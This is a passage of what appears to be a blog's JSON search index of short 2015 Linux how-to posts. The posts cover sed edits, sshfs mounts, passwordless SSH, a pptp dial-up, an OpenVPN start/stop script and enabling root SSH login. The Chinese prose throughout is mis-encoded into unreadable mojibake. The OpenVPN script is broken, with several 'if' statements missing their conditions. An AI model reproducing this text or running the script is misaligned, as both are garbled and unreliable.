ä¸ºå¯»é“æ—¶é—´ tlaä¸ºæ—‹è½¬æ—¶é—´ twm ä¸ºä¼ è¾“æ—¶é—´","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"ç£ç›˜å·¥ä½œåŸç†","slug":"ç£ç›˜å·¥ä½œåŸç†","permalink":"https://wangxiuwen.github.io/tags/%E7%A3%81%E7%9B%98%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/"}],"author":"wangxiuwen"},{"title":"sublime test3 ä¸­è®¾ç½®ä¸åœ¨æ–°çª—å£ä¸­æ‰“å¼€æ–‡ä»¶","slug":"history/tech/5953c4d0c2b92f5665eed986","date":"2015-12-21T03:22:18.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed986/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed986/","excerpt":"","text":"1ã€æ‰“å¼€ Preferences -&gt; Setting - Userï¼ˆè®¾ç½® - ç”¨æˆ·ï¼‰2ã€åœ¨æœ€åä¸€ä¸ªèŠ±æ‹¬å·ï¼ˆå³â€œï½â€ï¼‰å‰æ·»åŠ å¦‚ä¸‹å†…å®¹å³å¯ï¼šâ€œopen_files_in_new_windowâ€: false","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"sublime","slug":"sublime","permalink":"https://wangxiuwen.github.io/tags/sublime/"}],"author":"wangxiuwen"},{"title":"åœ¨Submine Text 3ä¸­è¦å¼€å¯è‡ªåŠ¨æ¢è¡Œ","slug":"history/tech/5953c4d0c2b92f5665eed985","date":"2015-12-21T03:21:24.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed985/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed985/","excerpt":"","text":"1ã€æ‰“å¼€ Preferences -&gt; Setting - Userï¼ˆè®¾ç½® - ç”¨æˆ·ï¼‰2ã€åœ¨æœ€åä¸€ä¸ªèŠ±æ‹¬å·ï¼ˆå³â€œï½â€ï¼‰å‰æ·»åŠ å¦‚ä¸‹å†…å®¹å³å¯ï¼šâ€œword_wrapâ€ : true","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"sublime","slug":"sublime","permalink":"https://wangxiuwen.github.io/tags/sublime/"}],"author":"wangxiuwen"},{"title":"æŸ¥çœ‹linux å‘½ä»¤æ˜¯å¦ä¸ºå†…å»º","slug":"history/tech/5953c4d0c2b92f5665eed984","date":"2015-12-21T02:40:22.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed984/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed984/","excerpt":"","text":"å‘½ä»¤:type type ls","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"linux hash å‘½ä»¤","slug":"history/tech/5953c4d0c2b92f5665eed983","date":"2015-12-21T02:35:30.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed983/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed983/","excerpt":"","text":"hashç”¨æˆ·æŸ¥çœ‹å‘½ä»¤ç¼“å­˜ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"linux æŸ¥çœ‹ç¯å¢ƒå˜é‡","slug":"history/tech/5953c4d0c2b92f5665eed982","date":"2015-12-21T02:35:00.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed982/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed982/","excerpt":"","text":"printenv","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"é€šè¿‡shellè„šæœ¬æ›¿æ¢å±æ€§æ–‡ä»¶ä¸­çš„æŸè¡Œè®°å½•","slug":"history/tech/5953c4d0c2b92f5665eed981","date":"2015-12-19T18:35:18.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed981/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed981/","excerpt":"","text":"å‡è®¾æœ‰å¦‚ä¸‹å±æ€§æ–‡ä»¶ file.confuser.name=testuser.password=123456é€šè¿‡shell è„šæœ¬å°† user.name å’Œ user.password çš„valueå€¼æ›¿æ¢ä¸ºå®é™…éœ€è¦çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œsed -i â€œs#^user.name=.#user.name=ç”¨æˆ·å#g&quot; path/to/file.confsed -i &quot;s#^user.password=.#user.password=å¯†ç #gâ€ path/to/file.conf","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"åœ¨æ–‡ä»¶æŒ‡å®šè¡Œæ’å…¥ä¸€è¡Œ","slug":"history/tech/5953c4d0c2b92f5665eed980","date":"2015-12-19T18:27:11.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed980/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed980/","excerpt":"","text":"sed -i â€˜1i\\abcâ€™ urfile","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"linux  diffæ¯”è¾ƒè¿œç¨‹å’Œæœ¬åœ°æ–‡ä»¶","slug":"history/tech/5953c4d0c2b92f5665eed97d","date":"2015-12-19T18:05:38.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed97d/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed97d/","excerpt":"","text":"ssh host â€œcat /dir/test.txtâ€ | diff - /dir/test.txt","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"linux  sshfs è¿œç¨‹æŒ‚è½½","slug":"history/tech/5953c4d0c2b92f5665eed97c","date":"2015-12-19T18:04:24.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed97c/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed97c/","excerpt":"","text":"apt-get install sshfssshfs mailto:root@192.168.1.218:/home/ /mnt/sshfs ç”¨æˆ·å@è¿œç¨‹ä¸»æœºIP:è¿œç¨‹ä¸»æœºè·¯å¾„ æœ¬åœ°æŒ‚è½½ç‚¹sshfs -o transform_symlinks -o follow_symlinks mailto:user@hostname: /home/username/sshfs-o transform_symlinks è¡¨ç¤ºè½¬æ¢ç»å¯¹é“¾æ¥ç¬¦å·ä¸ºç›¸å¯¹é“¾æ¥ç¬¦å·-o follow_symlinks æ²¿ç”¨æœåŠ¡å™¨ä¸Šçš„é“¾æ¥ç¬¦å·","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"ubuntu é…ç½® sshfs","slug":"history/tech/5953c4d0c2b92f5665eed97f","date":"2015-12-19T17:47:34.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed97f/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed97f/","excerpt":"","text":"apt-get install sshfsè¦æƒ³æŒ‚è½½è¿œç¨‹ç›®å½•ï¼Œä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å³å¯ï¼šsshfs user@hostname:path mout_pointè¿™é‡Œuserä¸ºè¿œç¨‹ä¸»æœºç”¨æˆ·åï¼Œhostnameä¸ºè¿œç¨‹ä¸»æœºIPåœ°å€ï¼Œpathä¸ºè¿œç¨‹ä¸»æœºä¸­æƒ³è¦æŒ‚è½½åˆ°æœ¬åœ°çš„ç›®å½•ï¼Œmount_pointä¸ºæŒ‚è½½åˆ°æœ¬åœ°çš„ç›®å½•ã€‚å½“ä¸éœ€è¦ä½¿ç”¨çš„æ—¶å€™ï¼Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å¸è½½ï¼šfusermount -u mount_pointå¦‚æœæƒ³è¦å¼€æœºè‡ªåŠ¨æŒ‚è½½ï¼Œå¯ä»¥åœ¨/etc/fstabä¸­åŠ å…¥ä¸‹é¢ä¸€è¡Œï¼šsshfs#user@hostname:path mount_point fuse defaults,auto,allow_other 0 0è¿™å°±è¦æ±‚å¿…é¡»å…ˆæŠŠsshè‡ªåŠ¨ç™»å½•é…ç½®å¥½äº†ï¼Œè®©rootç”¨æˆ·èƒ½å¤Ÿä½¿ç”¨userèº«ä»½ç™»å½•è¿œç¨‹ä¸»æœºï¼Œå¦å¤–allow_otherè¿™ä¸ªå‚æ•°å¾ˆé‡è¦ï¼Œæ²¡æœ‰è¿™ä¸ªå‚æ•°çš„è¯ï¼ŒæŒ‚è½½è¿‡æ¥çš„ç›®å½•åªæœ‰rootèƒ½å¤Ÿè®¿é—®ã€‚sshfs#root@server1:/home/qianrushi /mnt/qianrushi fuse delay_connect,defaults,auto,allow_other,port=22222,nonempty 0 0","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"linux å…å¯†ç ç™»å½•","slug":"history/tech/5953c4d0c2b92f5665eed97b","date":"2015-12-19T17:46:49.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed97b/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed97b/","excerpt":"","text":"a æœºå™¨å…å¯†ç ç™»å½• b æœºå™¨aæœºå™¨ä¸Šæ‰§è¡Œï¼šssh-keygen -t rsa -P â€˜â€™scp id_rsa.pub 192.168.100.10:/root/vim /etc/hosts192.168.100.10 s1bæœºå™¨ä¸Šæ‰§è¡Œï¼šcat id_rsa4.pub &gt; /root/.ssh/authorized_keysa æœºå™¨ç™»å½•ï¼šssh s1","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"centos é…ç½® sshfs","slug":"history/tech/5953c4d0c2b92f5665eed97e","date":"2015-12-19T17:37:02.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed97e/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed97e/","excerpt":"","text":"é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦å®‰è£…sshfsè½¯ä»¶ã€‚sshfsæ˜¯ä¸€ä¸ªåŸºäºSSHæ–‡ä»¶ä¼ è¾“åè®®çš„æ–‡ä»¶ç³»ç»Ÿå®¢æˆ·ç«¯ï¼Œå®ƒçš„å®˜æ–¹ç½‘é¡µæ˜¯ï¼šhttp://fuse.sourceforge.net/sshfs.html ã€‚åœ¨CentOSä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡yumæ¥å®‰è£…(æ³¨æ„ä½¿ç”¨yumå®‰è£…éœ€è¦å®‰è£…EPELæº)ï¼šyum -y install fuse-sshfså®‰è£…å¥½åï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨å»ºç«‹fuseç”¨æˆ·ç»„ï¼Œè¦ä½¿ç”¨sshfsçš„ç”¨æˆ·åªè¦åŠ å…¥è¿™ä¸ªç”¨æˆ·ç»„å³å¯ã€‚è¦æƒ³æŒ‚è½½è¿œç¨‹ç›®å½•ï¼Œä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å³å¯ï¼šsshfs user@hostname:path mout_pointè¿™é‡Œuserä¸ºè¿œç¨‹ä¸»æœºç”¨æˆ·åï¼Œhostnameä¸ºè¿œç¨‹ä¸»æœºIPåœ°å€ï¼Œpathä¸ºè¿œç¨‹ä¸»æœºä¸­æƒ³è¦æŒ‚è½½åˆ°æœ¬åœ°çš„ç›®å½•ï¼Œmount_pointä¸ºæŒ‚è½½åˆ°æœ¬åœ°çš„ç›®å½•ã€‚å½“ä¸éœ€è¦ä½¿ç”¨çš„æ—¶å€™ï¼Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å¸è½½ï¼šfusermount -u mount_pointå¦‚æœæƒ³è¦å¼€æœºè‡ªåŠ¨æŒ‚è½½ï¼Œå¯ä»¥åœ¨/etc/fstabä¸­åŠ å…¥ä¸‹é¢ä¸€è¡Œï¼šsshfs#user@hostname:path mount_point fuse defaults,auto,allow_other 0 0è¿™å°±è¦æ±‚å¿…é¡»å…ˆæŠŠsshè‡ªåŠ¨ç™»å½•é…ç½®å¥½äº†ï¼Œè®©rootç”¨æˆ·èƒ½å¤Ÿä½¿ç”¨userèº«ä»½ç™»å½•è¿œç¨‹ä¸»æœºï¼Œå¦å¤–allow_otherè¿™ä¸ªå‚æ•°å¾ˆé‡è¦ï¼Œæ²¡æœ‰è¿™ä¸ªå‚æ•°çš„è¯ï¼ŒæŒ‚è½½è¿‡æ¥çš„ç›®å½•åªæœ‰rootèƒ½å¤Ÿè®¿é—®ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"linux pptpd å®¢æˆ·ç«¯æ‹¨å·","slug":"history/tech/5953c4d0c2b92f5665eed97a","date":"2015-12-18T22:33:08.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed97a/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed97a/","excerpt":"","text":"pptpsetup --create pptpd --server 198.74.118.93 --username qianrushiâ€“password password --encrypt --start","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"openvpn å¯åŠ¨è„šæœ¬","slug":"history/tech/5953c4d0c2b92f5665eed979","date":"2015-12-18T22:28:48.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed979/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed979/","excerpt":"","text":"openvpn å¯åŠ¨è„šæœ¬#!/bin/bash #File: openvpn_turn #Auth: Robin #Date: 2013/01/17 10-30-10 #Desc: Start/stop openvpn client #Vers: 1.0 # # openvpn -s --&gt; stop openvpn client # openvpn -r --&gt; start openvpn client #é…ç½®æ–‡ä»¶æ‰€åœ¨ç›®å½• CONF_DIR=&quot;/etc/openvpn&quot; #é…ç½®æ–‡ä»¶ CONF_FILE=&quot;client.conf&quot; #å­˜æ”¾ç”¨æˆ·åå’Œå¯†ç ï¼Œæ ¼å¼å¦‚ä¸‹ # user_name # password AUTH_FILE=&quot;auth&quot; LOG_FILE=&quot;/tmp/openvpn.log&quot; PID_FILE=&quot;/tmp/openvpn.pid&quot; function do_success { ps -ef|grep openvpn|grep -v grep|awk '{print $2}' &gt;&gt; $PID_FILE rm $LOG_FILE echo -e &quot;Start OPENVPN \\033[32msuccessfully\\033[0m!&quot; exit 0 } function do_fail { echo -e &quot;Start OPENVPN \\033[41mfailure\\033[0m!&quot; echo &quot;Maybe you can get something useful from $LOG_FILE&quot; exit 1 } function if_run { if ;then return 0 else return 1 fi } function start_openvpn { if_run if ;then ps -ef|grep '\\&lt;openvpn\\&gt;' |grep -v grep &amp;&gt; /dev/null if ;then echo -e &quot;OPENVPN is \\033[32malready running\\033[0m!!!&quot; exit 1 else rm $PID_FILE fi fi if ;then echo &gt; $LOG_FILE fi cd $CONF_DIR sudo openvpn --config $CONF_FILE --auth-user-pass $AUTH_FILE &amp;&gt; $LOG_FILE &amp; echo -e &quot;\\033[33mStarting\\033[0m OPENVPN...&quot; sleep 5 cat $LOG_FILE |grep &quot;Sequence Completed&quot; 2&gt; /dev/null &amp;&amp; do_success || do_fail } function stop_openvpn { if_run if ;then echo &quot;OPENVPN is not running!&quot; exit 1 fi for i in `ps -ef|grep '\\&lt;openvpn\\&gt;'|grep -v grep|awk '{print $2}'`;do sudo kill -9 $i done rm $PID_FILE echo -e &quot;OPENVPN is already \\033[41mstop\\033[0m.&quot; } while getopts sr SW;do case $SW in s) stop_openvpn break ;; r) start_openvpn break ;; ?) echo &quot;openvpn_turn &quot; esac done","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"ubuntu å®‰è£…OpenVPNå®¢æˆ·ç«¯","slug":"history/tech/5953c4d0c2b92f5665eed978","date":"2015-12-18T22:27:46.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed978/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed978/","excerpt":"","text":"å®‰è£…# apt-get install openvpné…ç½®OpenVPNä½œä¸ºå®¢æˆ·ç«¯ï¼ŒOpenVPNå¹¶æ²¡æœ‰ç‰¹å®šçš„é…ç½®æ–‡ä»¶ï¼Œè€Œæ˜¯ç”±æœåŠ¡å™¨æä¾›æ–¹ç»™å‡ºä¸€ä¸ªé…ç½®æ–‡ä»¶ã€‚å¯¹äºè®¤è¯ï¼ŒOpenVPNæä¾›äº†ä¸¤ç§è®¤è¯æ–¹æ³•ï¼šåŸºäºç”¨æˆ·å/å¯†ç çš„è®¤è¯ä¸SSLè¯ä¹¦è®¤è¯ã€‚ç”¨æˆ·å/å¯†ç çš„è®¤è¯æ–¹æ³•æ— æ³•ï¼ˆæˆ–è¾ƒéš¾ï¼‰é™åˆ¶ä¸€ä¸ªè´¦å·åŒæ—¶è¿æ¥å¤šä¸ªå®¢æˆ·ç«¯ï¼Œè€Œé‡‡ç”¨è¯ä¹¦ï¼Œåˆ™å¯ä¿è¯åŒä¸€è¯ä¹¦åŒä¸€æ—¶é—´åªèƒ½æœ‰ä¸€ä¸ªå®¢æˆ·ç«¯è¿æ¥ã€‚å½“ç„¶ï¼Œè¿™äº›éƒ½æ˜¯ç”±æœåŠ¡å™¨ç«¯å†³å®šçš„ï¼Œä¸éœ€è¦å®¢æˆ·ç«¯è¿›è¡Œé€‰æ‹©ã€‚é¦–å…ˆå°†OpenVPNæœåŠ¡å™¨æä¾›å•†å‘ç»™ä½ çš„é…ç½®æ–‡ä»¶è§£å‹ï¼Œå¹¶å°†æ‰€æœ‰æ–‡ä»¶éƒ½å¤åˆ¶åˆ° /etc/openvpn/ä¸­ã€‚è¿™äº›æ–‡ä»¶ä¸­è‡³å°‘åŒ…å«ä¸€ä¸ª.ovpnæ–‡ä»¶ï¼›å¦‚æœæœåŠ¡å™¨éœ€è¦è¯ä¹¦è®¤è¯ï¼Œåˆ™åº”è¯¥è¿˜å­˜åœ¨å¦å¤–ä¸‰ä¸ªè¯ä¹¦æ–‡ä»¶ã€‚çœ‹æ‡‚OpenVPNé…ç½®æ ¼å¼ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ª.ovpné…ç½®ç¤ºä¾‹ï¼šclientdev tapproto tcp-clientremote 192.168.135.75 1194resolv-retry infinitenobindmute-replay-warningsredirect-gatewayca /etc/ca.crtcert /etc/client.crtkey /etc/client.keycomp-lzoverb 4å°†ä»¥ä¸‹å†…å®¹ä¿®æ”¹æˆè¿™ä¸‰ä¸ªæ–‡ä»¶çš„å®é™…ä½ç½®ï¼šca /etc/ca.crtcert /etc/client.crtkey /etc/client.keyè¿æ¥OpenVPNåœ¨é…ç½®å¥½.ovpnæ–‡ä»¶åï¼Œæ‰§è¡Œopenvpn /etc/***.ovpnå³å¯è¿æ¥æœåŠ¡å™¨äº†ã€‚æ³¨æ„ï¼Œä¸Šé¢çš„å‚æ•°åº”è¯¥æ¢æˆä½ çš„é…ç½®æ–‡ä»¶å®é™…ä½ç½®ã€‚æ­¤æ—¶ï¼Œç»ˆç«¯ä¼šå›æ˜¾å¾ˆå¤šè¿æ¥æ—¥å¿—ã€‚å¦‚æœè¿æ¥ä¸æˆåŠŸï¼Œåˆ™å¯ä»¥é€šè¿‡è¿™äº›æ—¥å¿—æ¥ç¡®å®šå‡ºé”™ä½ç½®ã€‚å¦‚æœè¦æ–­å¼€ï¼Œåªéœ€è¦é€šè¿‡Ctrl+Cå¼ºåˆ¶ç»ˆæ­¢å³å¯ã€‚ä¸Šé¢çš„å‘½ä»¤åœ¨å®é™…ä¸­å¹¶ä¸æ–¹ä¾¿ï¼Œå› ä¸ºå®ƒè¦å ç”¨ä¸€ä¸ªç‹¬ç«‹çš„ç»ˆç«¯ã€‚åœ¨æµ‹è¯•æˆåŠŸåï¼Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å³å¯åœ¨åå°è¿æ¥OpenVPNï¼šopenvpn /etc/***.ovpn &gt; /dev/null &amp;å€¼å¾—ç§°èµçš„æ˜¯ï¼Œopenvpnéå¸¸æ™ºèƒ½ï¼Œåœ¨è¿æ¥å¼‚å¸¸ä¸­æ–­ã€æ— æ³•è¿æ¥æœåŠ¡å™¨ã€æ–­ç½‘çš„æƒ…å†µä¸‹ï¼Œå®ƒä¼šè‡ªåŠ¨é‡è¿ã€‚å› æ­¤ï¼Œå¦‚æœå¸Œæœ›å¼€æœºå³è‡ªåŠ¨è¿æ¥OpenVPNï¼Œæˆ–è€…æ˜¯VPNå¸¸å¹´åœ¨çº¿ï¼Œåˆ™å¯å°†ä¸Šè¿°å‘½ä»¤è¡ŒåŠ å…¥/etc/rc.local","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"ubuntu å…è®¸rootè¿œç¨‹ç™»é™†","slug":"history/tech/5953c4d0c2b92f5665eed977","date":"2015-12-18T22:24:22.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed977/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed977/","excerpt":"","text":"å®‰è£…OpenSSH serverï¼šä½¿ç”¨aptå‘½ä»¤å®‰è£…openssh server$ sudo apt-get install openssh-serverå¯ä»¥å¯¹ openssh serverè¿›è¡Œé…ç½®$ sudo vi /etc/ssh/sshd_configæ‰¾åˆ°PermitRootLogin noä¸€è¡Œï¼Œæ”¹ä¸ºPermitRootLogin yesé‡å¯ openssh server$ sudo service ssh restart","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"ahjesus Axure RP 7.0æ³¨å†Œç 